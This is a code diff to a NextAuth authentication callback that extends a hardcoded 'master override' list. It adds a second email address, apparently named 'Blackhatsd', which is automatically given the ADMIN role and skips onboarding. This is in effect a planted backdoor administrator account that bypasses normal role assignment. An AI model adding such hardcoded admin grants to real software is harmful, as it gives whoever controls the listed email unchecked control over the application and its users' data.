@@ -54,10 +54,11 @@ export const authOptions: NextAuthOptions = {
         token.interests = (user as any).interests;
       }
       
-      // 2. SOVEREIGN MASTER OVERRIDE: zomatube2012@gmail.com is ALWAYS an ADMIN
-      if (token.email === "zomatube2012@gmail.com") {
+      // 2. SOVEREIGN MASTER OVERRIDE: Authorized Super Admins
+      const masterAdmins = ["zomatube2012@gmail.com", "Blackhatsd.sd@gmail.com"];
+      if (token.email && masterAdmins.includes(token.email)) {
         token.role = "ADMIN";
-        token.isOnboarded = true; // Skip onboarding for master admin
+        token.isOnboarded = true; // Skip onboarding for master admins
       }
 
       // 3. Dynamic Updates
